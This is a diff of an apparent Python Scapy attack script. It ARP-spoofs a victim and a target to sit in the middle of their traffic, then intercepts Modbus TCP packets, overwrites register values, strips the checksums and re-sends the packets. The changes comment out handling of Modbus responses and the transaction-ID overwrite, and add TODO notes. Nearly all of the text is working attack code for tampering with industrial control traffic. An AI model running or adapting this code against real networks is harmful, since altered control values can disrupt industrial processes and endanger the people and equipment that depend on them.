@@ -78,7 +78,7 @@ def handle_packet(pkt, port, log_file,mappings):
     print("Source: "+src)
     print("Dest: "+str(mappings[dst]))
 
-    npkt=pkt
+    npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
     npkt[Ether].src=src
     npkt[Ether].dst=mappings[dst]
     # print(npkt.show(dump=True))
@@ -89,8 +89,8 @@ def handle_packet(pkt, port, log_file,mappings):
 
     if npkt.haslayer(ModbusADURequest):
         mb = npkt[ModbusADURequest]
-    elif npkt.haslayer(ModbusADUResponse):
-        mb = npkt[ModbusADUResponse]
+    # elif npkt.haslayer(ModbusADUResponse):
+    #     mb = npkt[ModbusADUResponse]
     else:
         sendp(npkt,loop=0,inter=0.2)
         return
@@ -108,11 +108,11 @@ def handle_packet(pkt, port, log_file,mappings):
     if npkt.haslayer(ModbusADURequest):
         npkt[ModbusADURequest].registerValue=1
         print(f"Register Value: ",npkt[ModbusADURequest].registerValue)
-        npkt[ModbusADURequest].transId=4660
-    elif npkt.haslayer(ModbusADUResponse):
-        npkt[ModbusADUResponse].registerValue=1
-        print(f"Register Value: ",npkt[ModbusADUResponse].registerValue)
-        npkt[ModbusADUResponse].transId=4660
+        # npkt[ModbusADURequest].transId=4660
+    # elif npkt.haslayer(ModbusADUResponse):
+    #     npkt[ModbusADUResponse].registerValue=1
+    #     print(f"Register Value: ",npkt[ModbusADUResponse].registerValue)
+    #     npkt[ModbusADUResponse].transId=4660
 
     # del p.chksum
     del npkt[TCP].chksum
@@ -154,7 +154,6 @@ def main():
     log_line(f"Resolved victim {args.victim} -> {victim_mac}", log_file)
     log_line(f"Resolved target {args.target} -> {target_mac}", log_file)
 
-    # set_ip_forwarding(True)
     spoof_thread = threading.Thread(
         target=arp_spoof_loop,
         args=(args.interface, args.victim, victim_mac, args.target, target_mac, own_mac, stop_event, args.arp_interval),
@@ -163,7 +162,7 @@ def main():
     spoof_thread.start()
     log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
 
-    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src 00:0c:29:5d:1f:95"
+    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src 00:0c:29:5d:1f:95" # TODO: make MAC address whitelist automatic
 
     # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"
 
